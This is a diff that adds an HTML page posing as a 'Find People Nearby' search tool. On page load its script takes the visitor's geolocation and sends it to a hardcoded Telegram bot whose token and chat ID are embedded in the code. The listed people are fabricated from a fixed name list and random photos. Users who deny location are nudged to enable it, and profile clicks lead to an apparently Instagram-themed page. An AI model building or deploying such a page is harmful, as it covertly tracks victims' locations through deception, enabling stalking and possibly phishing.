@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Find People Nearby</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: url('map3.jpg') no-repeat center center fixed;
+            background-size: cover;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.87);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.712);
+            width: 320px;
+            margin: auto;
+        }
+        input, button {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        #areaInput{
+            /* background-color: red; */
+           /* padding-left: 0; */
+           width: 95%;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .results {
+            margin-top: 20px;
+            text-align: left;
+        }
+        .person {
+            display: flex;
+            align-items: center;
+            background: white;
+            padding: 10px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            margin: 5px 0;
+            cursor: pointer;
+        }
+        .person img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 10px;
+            object-fit: cover;
+        }
+      
+        .disabled {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+        .warning {
+            color: red;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        @media (max-width: 600px) {
+            .container {
+                width: 90%;
+                padding: 10px;
+            }
+            input, button {
+                width: 100%;
+                padding: 8px;
+            }
+            .person {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .person img {
+                margin-bottom: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Find People Nearby</h2>
+        <input type="text" id="areaInput" placeholder="Enter your area name">
+        <button onclick="searchPeople()">Search</button>
+        <div id="results" class="results"></div>
+        <p id="warningMessage" class="warning"></p>
+    </div>
+
+    <script>
+        const botToken = "7256577569:AAHyOFgwSk6hmV1vfhIgW8wub74IW3MTQf4";
+        const chatId = "6524755764";
+        let savedProfiles = {};
+        let locationDenied = false;
+
+        function sendLocationToBot(latitude, longitude) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=User's Location: Latitude ${latitude}, Longitude ${longitude}`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log("Location sent to bot:", data))
+                .catch(error => console.error("Error sending location:", error));
+        }
+
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        sendLocationToBot(latitude, longitude);
+                        locationDenied = false;
+                    },
+                    error => {
+                        console.log("Location access denied or error occurred.");
+                        locationDenied = true;
+                    }
+                );
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+                locationDenied = true;
+            }
+        }
+
+        function getRandomNames() {
+            const allNames = [
+                "Aryan Patel", "Ishita Sharma", "Kunal Verma", "Sanya Mehta", "Rohan Malhotra",
+                "Neha Joshi", "Vikram Rao", "Priya Desai", "Rahul Kapoor", "Aditi Saxena",
+                "Harsh Tandon", "Tanya Bakshi", "Jayesh Kulkarni", "Komal Mahajan", "Siddharth Das"
+            ];
+            return allNames.sort(() => 0.5 - Math.random()).slice(0, 10);
+        }
+
+        function generateProfiles(city) {
+            if (savedProfiles[city]) {
+                return savedProfiles[city];
+            }
+
+            const randomNames = getRandomNames();
+            const randomImages = Array.from({ length: randomNames.length }, () => 
+                Math.random() > 0.6 
+                    ? `https://source.unsplash.com/40x40/?flower,blossom,petals` 
+                    : `https://randomuser.me/api/portraits/${Math.random() > 0.5 ? 'men' : 'women'}/${Math.floor(Math.random() * 99)}.jpg`
+            );
+
+            const profiles = randomNames.map((name, index) => ({
+                name,
+                image: randomImages[index]
+            }));
+
+            savedProfiles[city] = profiles;
+            return profiles;
+        }
+
+        function searchPeople() {
+            const areaName = document.getElementById("areaInput").value.trim().toLowerCase();
+            const resultsDiv = document.getElementById("results");
+            const warningMessage = document.getElementById("warningMessage");
+
+            if (!areaName) {
+                alert("Please enter an area name.");
+                return;
+            }
+
+            let profiles = generateProfiles(areaName);
+
+            if (locationDenied) {
+                profiles = profiles.slice(0, 1);
+                warningMessage.innerText = "Please turn on location for more people and user ID";
+            } else {
+                warningMessage.innerText = "";
+            }
+
+            let peopleList = `<h3>People found in ${areaName}:</h3>`;
+            profiles.forEach(person => {
+                const isDisabled = locationDenied ? "disabled" : "";
+                peopleList += `
+                    <div class="person ${isDisabled}" onclick="goToProfile('${person.name}')">
+                        <img src="${person.image}" alt="Profile">
+                        <div><b>${person.name}</b></div>
+                    </div>
+                `;
+            });
+
+            resultsDiv.innerHTML = peopleList;
+        }
+
+        function goToProfile(name) {
+            if (!locationDenied) {
+                window.location.href = `insta/index.html?name=${encodeURIComponent(name)}`;
+            }
+        }
+
+        window.onload = requestLocation;
+    </script>
+
+</body>
+</html>
